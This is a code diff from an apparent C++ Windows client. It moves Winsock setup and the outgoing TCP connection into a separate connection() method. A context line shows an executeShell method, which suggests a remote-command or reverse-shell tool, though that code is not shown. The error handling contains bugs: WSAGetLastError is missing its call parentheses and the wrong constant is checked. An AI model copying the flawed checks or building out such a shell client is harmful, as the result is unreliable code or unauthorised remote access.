@@ -9,34 +9,7 @@ Connection::Connection(string ip, unsigned int port) {
     Connection::ip = ip;
     Connection::port = port;
 
-    WSADATA wsadata;
-    WORD ver = MAKEWORD(2, 2);
-    int wResult = WSAStartup(ver, &wsadata);
 
-    if (wResult != 0) {
-        cerr << "Cant start Winsock" << endl;
-        return;
-    }
-
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) {
-        cerr << "Cant create socket" << WSAGetLastError << endl;
-        WSACleanup();
-        return;
-    }
-    sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(port);
-    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
-
-    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));
-
-    if (connectionResult == INVALID_SOCKET) {
-        cerr << "Cant connect to server" << WSAGetLastError << endl;
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
 }
 
 void Connection::sendMessage(string message) {
@@ -136,7 +109,37 @@ void Connection::executeShell(string shell) {
 }
 
 
+void Connection::connection() {
+    WSADATA wsadata;
+    WORD ver = MAKEWORD(2, 2);
+    int wResult = WSAStartup(ver, &wsadata);
 
+    if (wResult != 0) {
+        cerr << "Cant start Winsock" << endl;
+        return;
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        cerr << "Cant create socket" << WSAGetLastError << endl;
+        WSACleanup();
+        return;
+    }
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
+
+    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));
+
+    if (connectionResult == INVALID_SOCKET) {
+        cerr << "Cant connect to server" << WSAGetLastError << endl;
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+    return;
+}
 
 
 
